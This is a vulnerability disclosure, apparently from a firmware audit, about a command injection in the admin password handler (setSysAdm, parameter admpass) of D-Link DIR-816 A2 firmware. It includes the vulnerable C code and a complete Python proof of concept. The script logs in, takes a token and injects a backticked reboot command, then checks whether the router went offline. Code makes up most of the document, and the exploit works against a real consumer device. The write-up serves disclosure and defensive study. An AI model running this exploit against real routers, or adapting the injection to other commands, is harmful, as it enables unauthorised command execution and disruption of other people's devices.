## DIR 816

> bin_vision:DIR-816A2_v1.10CNB03_D77137
> goahead
> goform/setSysAdm
>
> type: command injection
> string: admpass

### description

The `setSysAdm` handler receives the user-controlled `admpass` parameter from the GoAhead web request. The value is read directly via `websGetVar()` with no sanitization. It is interpolated into a `chpasswd.sh` command via `doSystem()` for shell execution.

Vulnerability chain: `websGetVar("admpass")` -> `doSystem("chpasswd.sh %s %s")`.

An authenticated attacker can inject shell metacharacters (e.g. backticks) in the `admpass` field to achieve command execution when the admin password is changed.

### code

#### setSysAdm handler

~~~c
  websFormDefine("setSysAdm", (int)setSysAdm_handler);
~~~

~~~c
// setSysAdm handler - Admin password change
void setSysAdm(int wp)
{
    char *user = websGetVar(wp, "admuser", "Admin");
    char *pass = websGetVar(wp, "admpass", "");     // <--- Read user-controlled admpass from the request

    // Password used directly in shell command - NO SANITIZATION
    doSystem("chpasswd.sh %s %s", user, pass);      // <--- Execute command with tainted value; command injection triggers here

    // Also stored in NVRAM
    nvram_bufset(0, "Login", user);
    nvram_bufset(0, "Password", pass);
}
~~~

### PoC

Source: `PoC/CNB03_v1.10/verified/poc_setSysAdm.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in Admin Password Change (setSysAdm)
Firmware: DIR-816A2_v1.10CNB03_D77137
Entry: 000326
Endpoint: /goform/setSysAdm
Parameter: admpass
Sink: doSystem("chpasswd.sh %s %s") - DIRECT
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in Admin Password Change (setSysAdm)")
    print(f"[*] Endpoint: /goform/setSysAdm")
    print(f"[*] Parameter: admpass")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "`reboot`"
    data = {"tokenid": tokenid, "admuser": "Admin", "admpass": payload}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/setSysAdm", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
